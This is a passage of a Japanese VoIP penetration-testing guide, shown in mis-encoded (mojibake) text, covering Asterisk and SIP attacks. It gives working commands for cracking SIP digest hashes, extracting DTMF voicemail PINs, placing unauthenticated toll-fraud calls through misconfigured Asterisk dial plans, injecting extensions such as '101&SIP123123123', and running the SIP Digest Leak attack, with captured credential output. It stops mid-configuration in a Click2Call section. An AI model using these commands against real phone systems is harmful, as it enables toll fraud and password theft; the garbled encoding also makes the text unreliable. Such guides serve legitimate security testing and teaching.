* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrackã¯ã€SIPPTSãƒ€ãƒ³ãƒ—ã§å–å¾—ã—ãŸãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆèªè¨¼ã‚’ã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tsharkã¯PCAPãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰SIPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ãƒ‡ãƒ¼ã‚¿ã‚’æŠ½å‡ºã—ã¾ã™ã€‚
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF ã‚³ãƒ¼ãƒ‰

**SIP èªè¨¼æƒ…å ±**ã ã‘ã§ãªãã€**ãƒœã‚¤ã‚¹ãƒ¡ãƒ¼ãƒ«**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ DTMF ã‚³ãƒ¼ãƒ‰ã‚‚ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯å†…ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ã‚³ãƒ¼ãƒ‰ã¯ **INFO SIP ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸**ã€**éŸ³å£°**ã€ã¾ãŸã¯ **RTP ãƒ‘ã‚±ãƒƒãƒˆ**å†…ã§é€ä¿¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã‚³ãƒ¼ãƒ‰ãŒ RTP ãƒ‘ã‚±ãƒƒãƒˆå†…ã«ã‚ã‚‹å ´åˆã€ãã®ä¼šè©±ã®éƒ¨åˆ†ã‚’åˆ‡ã‚Šå–ã‚Šã€ãƒ„ãƒ¼ãƒ« multimo ã‚’ä½¿ç”¨ã—ã¦æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
multimon -a DTMF -t wac pin.wav
```
### ç„¡æ–™é€šè©± / Asteriskæ¥ç¶šã®èª¤è¨­å®š

Asteriskã§ã¯ã€**ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹**ã‹ã‚‰ã®æ¥ç¶šã‚’è¨±å¯ã™ã‚‹ã“ã¨ã‚‚ã€**ä»»æ„ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹**ã‹ã‚‰ã®æ¥ç¶šã‚’è¨±å¯ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š
```
host=10.10.10.10
host=dynamic
```
ã‚‚ã—IPã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæŒ‡å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ›ã‚¹ãƒˆã¯**REGISTER**ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ™‚ã€…é€ä¿¡ã™ã‚‹å¿…è¦ãŒãªããªã‚Šã¾ã™ï¼ˆREGISTERãƒ‘ã‚±ãƒƒãƒˆã«ã¯ç”Ÿå­˜æ™‚é–“ãŒé€ä¿¡ã•ã‚Œã€é€šå¸¸ã¯30åˆ†ã§ã‚ã‚Šã€ä»–ã®ã‚·ãƒŠãƒªã‚ªã§ã¯é›»è©±ã¯30åˆ†ã”ã¨ã«REGISTERã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚ãŸã ã—ã€VoIPã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã®æ¥ç¶šã‚’å—ã‘å…¥ã‚Œã‚‹ãŸã‚ã«ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ¼ãƒˆãŒå¿…è¦ã§ã™ã€‚

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å®šç¾©ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«å®šç¾©ã§ãã¾ã™ï¼š

* **`type=user`**: ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã®ã¿é€šè©±ã‚’å—ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **`type=friend`**: ãƒ”ã‚¢ã¨ã—ã¦é€šè©±ã‚’è¡Œã„ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦å—ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆæ‹¡å¼µæ©Ÿèƒ½ã¨å…±ã«ä½¿ç”¨ï¼‰ã€‚
* **`type=peer`**: ãƒ”ã‚¢ã¨ã—ã¦é€šè©±ã‚’é€å—ä¿¡ã§ãã¾ã™ï¼ˆSIPãƒˆãƒ©ãƒ³ã‚¯ï¼‰ã€‚

ä¸æ­£ãªå¤‰æ•°ã‚’ä½¿ç”¨ã—ã¦ä¿¡é ¼ã‚’ç¢ºç«‹ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š

* **`insecure=port`**: IPã«ã‚ˆã£ã¦æ¤œè¨¼ã•ã‚ŒãŸãƒ”ã‚¢æ¥ç¶šã‚’è¨±å¯ã—ã¾ã™ã€‚
* **`insecure=invite`**: INVITEãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®èªè¨¼ã‚’å¿…è¦ã¨ã—ã¾ã›ã‚“ã€‚
* **`insecure=port,invite`**: ä¸¡æ–¹ã€‚

{% hint style="warning" %}
**`type=friend`**ãŒä½¿ç”¨ã•ã‚Œã‚‹ã¨ã€**host**å¤‰æ•°ã®**å€¤**ã¯**ä½¿ç”¨ã•ã‚Œã¾ã›ã‚“**ã€‚ã—ãŸãŒã£ã¦ã€ç®¡ç†è€…ãŒãã®å€¤ã‚’ä½¿ç”¨ã—ã¦**SIPãƒˆãƒ©ãƒ³ã‚¯ã‚’èª¤è¨­å®š**ã—ãŸå ´åˆã€**èª°ã§ã‚‚æ¥ç¶šã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™**ã€‚

ä¾‹ãˆã°ã€ã“ã®è¨­å®šã¯è„†å¼±ã§ã™ï¼š\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### ç„¡æ–™é€šè©± / Asteriskã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®èª¤è¨­å®š

Asteriskã«ãŠã„ã¦ã€**ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã¯ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³å†…ã®é–¢é€£ã™ã‚‹æ‹¡å¼µæ©Ÿèƒ½ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã€ãŠã‚ˆã³ãƒ«ãƒ¼ãƒ«ã‚’**ã‚°ãƒ«ãƒ¼ãƒ—åŒ–ã™ã‚‹**åå‰ä»˜ãã‚³ãƒ³ãƒ†ãƒŠã¾ãŸã¯ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ã¯Asteriskã‚·ã‚¹ãƒ†ãƒ ã®ã‚³ã‚¢ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã‚ã‚Šã€**ç€ä¿¡ãŠã‚ˆã³ç™ºä¿¡é€šè©±ãŒã©ã®ã‚ˆã†ã«å‡¦ç†ã•ã‚Œã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã•ã‚Œã‚‹ã‹ã‚’å®šç¾©ã—ã¾ã™**ã€‚ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ã‚’æ•´ç†ã—ã€ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã‚’ç®¡ç†ã—ã€ã‚·ã‚¹ãƒ†ãƒ ã®ç•°ãªã‚‹éƒ¨åˆ†é–“ã®åˆ†é›¢ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

å„ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã€é€šå¸¸ã¯**`extensions.conf`**ãƒ•ã‚¡ã‚¤ãƒ«ã§å®šç¾©ã•ã‚Œã¾ã™ã€‚ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯è§’æ‹¬å¼§ã§ç¤ºã•ã‚Œã€ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆåãŒãã®ä¸­ã«å›²ã¾ã‚Œã¦ã„ã¾ã™ã€‚ä¾‹ãˆã°ï¼š
```bash
csharpCopy code[my_context]
```
å†…éƒ¨ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ã¯ã€æ‹¡å¼µå­ï¼ˆãƒ€ã‚¤ãƒ¤ãƒ«ã•ã‚ŒãŸç•ªå·ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ï¼‰ã‚’å®šç¾©ã—ã€ãã‚Œã‚’ä¸€é€£ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€é€šè©±ãŒã©ã®ã‚ˆã†ã«å‡¦ç†ã•ã‚Œã‚‹ã‹ã‚’æ±ºå®šã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼š
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
ã“ã®ä¾‹ã¯ã€ã€Œmy\_contextã€ã¨ã„ã†ã‚·ãƒ³ãƒ—ãƒ«ãªã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¨ã€Œ100ã€ã¨ã„ã†æ‹¡å¼µã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚èª°ã‹ãŒ100ã‚’ãƒ€ã‚¤ãƒ¤ãƒ«ã™ã‚‹ã¨ã€é€šè©±ãŒå¿œç­”ã•ã‚Œã€ã‚¦ã‚§ãƒ«ã‚«ãƒ ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒå†ç”Ÿã•ã‚Œã€ãã®å¾Œé€šè©±ãŒçµ‚äº†ã—ã¾ã™ã€‚

ã“ã‚Œã¯ã€**ä»–ã®ä»»æ„ã®ç•ªå·ã«å‘¼ã³å‡ºã™ã“ã¨ã‚’è¨±å¯ã™ã‚‹** **åˆ¥ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã§ã™ï¼š
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
ã‚‚ã—ç®¡ç†è€…ãŒ**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã‚’æ¬¡ã®ã‚ˆã†ã«å®šç¾©ã—ãŸå ´åˆ:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
èª°ã§ã‚‚**ã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ã£ã¦ä»–ã®ç•ªå·ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹**ï¼ˆã‚µãƒ¼ãƒãƒ¼ã®ç®¡ç†è€…ãŒé€šè©±æ–™é‡‘ã‚’æ”¯æ‰•ã†ã“ã¨ã«ãªã‚Šã¾ã™ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
ã•ã‚‰ã«ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§**`sip.conf`**ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯**`allowguest=true`**ãŒå«ã¾ã‚Œã¦ã„ã‚‹ãŸã‚ã€**èªè¨¼ãªã—**ã®**ä»»æ„ã®**æ”»æ’ƒè€…ãŒä»–ã®ç•ªå·ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

*   **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS inviteã¯ã€**PBXã‚µãƒ¼ãƒãƒ¼ãŒèªè¨¼ãªã—ã§é€šè©±ã‚’è¨±å¯ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™**ã€‚SIPã‚µãƒ¼ãƒãƒ¼ã«ä¸æ­£ãªè¨­å®šãŒã‚ã‚‹å ´åˆã€å¤–éƒ¨ç•ªå·ã¸ã®é€šè©±ã‚’è¨±å¯ã—ã¾ã™ã€‚ã¾ãŸã€é€šè©±ã‚’ç¬¬äºŒã®å¤–éƒ¨ç•ªå·ã«è»¢é€ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

ä¾‹ãˆã°ã€Asteriskã‚µãƒ¼ãƒãƒ¼ã«ä¸é©åˆ‡ãªã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆè¨­å®šãŒã‚ã‚‹å ´åˆã€èªè¨¼ãªã—ã§INVITEãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘å…¥ã‚Œã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®å ´åˆã€æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çŸ¥ã‚‰ãªãã¦ã‚‚é€šè©±ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### ç„¡æ–™é€šè©± / èª¤è¨­å®šã•ã‚ŒãŸIVRS

IVRSã¯**ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–éŸ³å£°å¿œç­”ã‚·ã‚¹ãƒ†ãƒ **ã‚’æŒ‡ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒéŸ³å£°ã¾ãŸã¯ãƒˆãƒ¼ãƒ³å…¥åŠ›ã‚’é€šã˜ã¦ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿åŒ–ã•ã‚ŒãŸã‚·ã‚¹ãƒ†ãƒ ã¨å¯¾è©±ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹é›»è©±æŠ€è¡“ã§ã™ã€‚IVRSã¯ã€æƒ…å ±æä¾›ã€é€šè©±ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®å–å¾—ãªã©ã€ã•ã¾ã–ã¾ãªæ©Ÿèƒ½ã‚’æä¾›ã™ã‚‹**è‡ªå‹•é€šè©±å‡¦ç†**ã‚·ã‚¹ãƒ†ãƒ ã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

VoIPã‚·ã‚¹ãƒ†ãƒ ã«ãŠã‘ã‚‹IVRSã¯é€šå¸¸ã€ä»¥ä¸‹ã§æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ï¼š

1. **éŸ³å£°ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆ**ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’IVRãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚„æŒ‡ç¤ºã«å°ãäº‹å‰éŒ²éŸ³ã•ã‚ŒãŸéŸ³å£°ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã€‚
2. **DTMF**ï¼ˆãƒ‡ãƒ¥ã‚¢ãƒ«ãƒˆãƒ¼ãƒ³å¤šå‘¨æ³¢ï¼‰ä¿¡å·ï¼šé›»è©±ã®ã‚­ãƒ¼ã‚’æŠ¼ã™ã“ã¨ã§ç”Ÿæˆã•ã‚Œã‚‹ãƒˆãƒ¼ãƒ³å…¥åŠ›ã§ã€IVRãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã—ã€å…¥åŠ›ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
3. **é€šè©±ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°**ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã«åŸºã¥ã„ã¦ã€ç‰¹å®šã®éƒ¨é–€ã€ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã€ã¾ãŸã¯å†…ç·šãªã©ã€é©åˆ‡ãªå®›å…ˆã«é€šè©±ã‚’èª˜å°ã—ã¾ã™ã€‚
4. **ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®å–å¾—**ï¼šå‘¼ã³å‡ºã—è€…ã‹ã‚‰ã®æƒ…å ±ã‚’åé›†ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆç•ªå·ã€ã‚±ãƒ¼ã‚¹IDã€ã¾ãŸã¯ãã®ä»–ã®é–¢é€£ãƒ‡ãƒ¼ã‚¿ãªã©ã§ã™ã€‚
5. **å¤–éƒ¨ã‚·ã‚¹ãƒ†ãƒ ã¨ã®çµ±åˆ**ï¼šIVRã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚„ä»–ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚·ã‚¹ãƒ†ãƒ ã«æ¥ç¶šã—ã€æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã¾ãŸã¯æ›´æ–°ã—ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ã‚¤ãƒ™ãƒ³ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ãŸã‚Šã—ã¾ã™ã€‚

Asterisk VoIPã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã€ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ï¼ˆ**`extensions.conf`**ãƒ•ã‚¡ã‚¤ãƒ«ï¼‰ã¨`Background()`ã€`Playback()`ã€`Read()`ãªã©ã®ã•ã¾ã–ã¾ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦IVRã‚’ä½œæˆã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€éŸ³å£°ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã‚’å†ç”Ÿã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’å–å¾—ã—ã€é€šè©±ã®æµã‚Œã‚’åˆ¶å¾¡ã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚

#### è„†å¼±ãªè¨­å®šã®ä¾‹
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
å‰è¿°ã®ä¾‹ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**1ã‚’æŠ¼ã—ã¦**éƒ¨é–€ã«é›»è©±ã™ã‚‹ã‚ˆã†ã«ã€**2ã‚’æŠ¼ã—ã¦**åˆ¥ã®éƒ¨é–€ã«é›»è©±ã™ã‚‹ã‚ˆã†ã«ã€ã¾ãŸã¯çŸ¥ã£ã¦ã„ã‚‹å ´åˆã¯**å®Œå…¨ãªå†…ç·šç•ªå·**ã‚’å…¥åŠ›ã™ã‚‹ã‚ˆã†ã«æ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚\
è„†å¼±æ€§ã¯ã€æŒ‡å®šã•ã‚ŒãŸ**å†…ç·šç•ªå·ã®é•·ã•ãŒãƒã‚§ãƒƒã‚¯ã•ã‚Œãªã„**ãŸã‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ5ç§’ã®ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã‚’æŒã¤å®Œå…¨ãªç•ªå·ã‚’å…¥åŠ›ã™ã‚‹ã¨ã€ãã‚ŒãŒå‘¼ã³å‡ºã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã§ã™ã€‚

### Extension Injection

æ¬¡ã®ã‚ˆã†ãªå†…ç·šã‚’ä½¿ç”¨ã—ã¦:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Where **`${EXTEN}`** ã¯ **å‘¼ã³å‡ºã•ã‚Œã‚‹å†…ç·šç•ªå·** ã§ã‚ã‚Šã€**ext 101 ãŒå°å…¥ã•ã‚Œã‚‹ã¨** ã“ã‚ŒãŒèµ·ã“ã‚Šã¾ã™:
```scss
exten => 101,1,Dial(SIP/101)
```
ã—ã‹ã—ã€ã‚‚ã— **`${EXTEN}`** ãŒ **æ•°å­—ä»¥å¤–ã®ã‚‚ã®**ï¼ˆå¤ã„Asteriskãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ã‚ˆã†ã«ï¼‰ã‚’å…¥åŠ›ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã™ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ **`101&SIP123123123`** ã‚’å…¥åŠ›ã—ã¦é›»è©±ç•ªå·123123123ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã—ã¦ã€ã“ã‚ŒãŒçµæœã«ãªã‚Šã¾ã™ï¼š
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
ã—ãŸãŒã£ã¦ã€**`101`**ãŠã‚ˆã³**`123123123`**ã¸ã®å‘¼ã³å‡ºã—ãŒé€ä¿¡ã•ã‚Œã€æœ€åˆã®ã‚‚ã®ã ã‘ãŒæ¥ç¶šã•ã‚Œã¾ã™... ã—ã‹ã—ã€æ”»æ’ƒè€…ãŒ**ãƒãƒƒãƒã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ‹¡å¼µå­**ã‚’ä½¿ç”¨ã—ã€å­˜åœ¨ã—ãªã„å ´åˆã€å½¼ã¯**æœ›ã¾ã—ã„ç•ªå·ã«ã®ã¿å‘¼ã³å‡ºã—ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã‚‹**ã€‚

## SIPDigestLeak è„†å¼±æ€§

SIP Digest Leakã¯ã€å¤šãã®SIPé›»è©±ã€ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ãŠã‚ˆã³ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®IPé›»è©±ã€é›»è©±ã‚¢ãƒ€ãƒ—ã‚¿ï¼ˆVoIPã‹ã‚‰ã‚¢ãƒŠãƒ­ã‚°ï¼‰ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹è„†å¼±æ€§ã§ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‹ã‚‰è¨ˆç®—ã•ã‚ŒãŸDigestèªè¨¼å¿œç­”ã®æ¼æ´©**ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚**ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰æ”»æ’ƒãŒå¯èƒ½**ã§ã‚ã‚Šã€ãƒãƒ£ãƒ¬ãƒ³ã‚¸å¿œç­”ã«åŸºã¥ã„ã¦ã»ã¨ã‚“ã©ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å›å¾©ã§ãã¾ã™ã€‚

**[è„†å¼±æ€§ã‚·ãƒŠãƒªã‚ªã¯ã“ã¡ã‚‰ã‹ã‚‰**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IPé›»è©±ï¼ˆè¢«å®³è€…ï¼‰ã¯ä»»æ„ã®ãƒãƒ¼ãƒˆï¼ˆä¾‹ï¼š5060ï¼‰ã§é›»è©±ã‚’å—ã‘ä»˜ã‘ã¦ã„ã¾ã™
2. æ”»æ’ƒè€…ã¯IPé›»è©±ã«INVITEã‚’é€ä¿¡ã—ã¾ã™
3. è¢«å®³è€…ã®é›»è©±ãŒé³´ã‚Šã€èª°ã‹ãŒé›»è©±ã‚’å–ã‚Šã€ã™ãã«åˆ‡ã‚Šã¾ã™ï¼ˆç›¸æ‰‹ãŒå¿œç­”ã—ãªã„ãŸã‚ï¼‰
4. é›»è©±ãŒåˆ‡ã‚‰ã‚Œã‚‹ã¨ã€**è¢«å®³è€…ã®é›»è©±ã¯æ”»æ’ƒè€…ã«BYEã‚’é€ä¿¡ã—ã¾ã™**
5. **æ”»æ’ƒè€…ã¯407å¿œç­”ã‚’ç™ºè¡Œã—**ã€**èªè¨¼ã‚’è¦æ±‚ã—**ã€èªè¨¼ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã‚’ç™ºè¡Œã—ã¾ã™
6. **è¢«å®³è€…ã®é›»è©±ã¯2å›ç›®ã®BYEã§èªè¨¼ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«å¯¾ã™ã‚‹å¿œç­”ã‚’æä¾›ã—ã¾ã™**
7. **æ”»æ’ƒè€…ã¯ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ï¼ˆã¾ãŸã¯åˆ†æ•£ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãªã©ï¼‰ã§ãƒãƒ£ãƒ¬ãƒ³ã‚¸å¿œç­”ã«å¯¾ã—ã¦ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚’ç™ºè¡Œã—**ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¨æ¸¬ã§ãã¾ã™

* **SIPPTSæ¼æ´©**ã¯[**sippts**](https://github.com/Pepelux/sippts)**ã‹ã‚‰:** SIPPTSæ¼æ´©ã¯ã€å¤šãã®SIPé›»è©±ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹SIP Digest Leakè„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚å‡ºåŠ›ã¯SipCrackå½¢å¼ã§ä¿å­˜ã§ãã€SIPPTS dcrackã¾ãŸã¯SipCrackãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã§ãã¾ã™ã€‚
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Callã¯ã€**ã‚¦ã‚§ãƒ–ãƒ¦ãƒ¼ã‚¶ãƒ¼**ï¼ˆä¾‹ãˆã°ã€è£½å“ã«èˆˆå‘³ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œãªã„ï¼‰ã«**é›»è©±ç•ªå·**ã‚’**æä¾›**ã•ã›ã¦ã€é›»è©±ã‚’å—ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã«ã€å•†æ¥­ç”¨ã®é›»è©±ãŒã‹ã‹ã‚Šã€å½¼ãŒ**é›»è©±ã«å‡ºã‚‹**ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¨æ¥ç¶šã•ã‚Œã¾ã™**ã€‚

ã“ã‚Œã«ä¸€èˆ¬çš„ãªAsteriskãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
